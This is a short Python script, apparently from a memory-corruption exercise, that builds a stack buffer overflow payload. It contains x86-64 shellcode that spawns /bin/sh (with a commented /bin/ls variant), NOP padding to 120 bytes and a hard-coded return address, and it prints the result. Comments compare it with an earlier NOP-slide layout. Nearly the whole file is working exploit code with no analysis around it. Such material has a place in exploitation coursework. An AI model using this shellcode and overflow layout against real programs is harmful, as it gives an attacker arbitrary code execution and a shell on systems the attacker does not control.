#shellcode = '\x48\x31\xc0\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x6c\x73\x48\xc1\xeb\x08\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\xb0\x3b\x0f\x05' # for /bin/ls
shellcode = '\x48\x31\xc0\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\xb0\x3b\x0f\x05' # for /bin/sh

#padding = '\x90' * (104 - len(shellcode))
#unknown = '\0' * 8
#saved_fp = '\xd0\xeb\xff\xff\xff\x7f\x00\x00'
#return_addr = '\x40\xeb\xff\xff\xff\x7f\x00'
#exploit = padding + shellcode + unknown + saved_fp + return_addr

padding = '\x90' * (120 - len(shellcode))
return_addr = '\x40\xeb\xff\xff\xff\x7f\x00'
exploit = shellcode + padding + return_addr

# Initial exploit would nop-slide into shellcode. This worked, but wasn't needed (and shellcode stack usage came very close to overwriting the shellcode).
# Current version is simpler, and saver in case the shellcode requires more stack memory.

print(exploit)
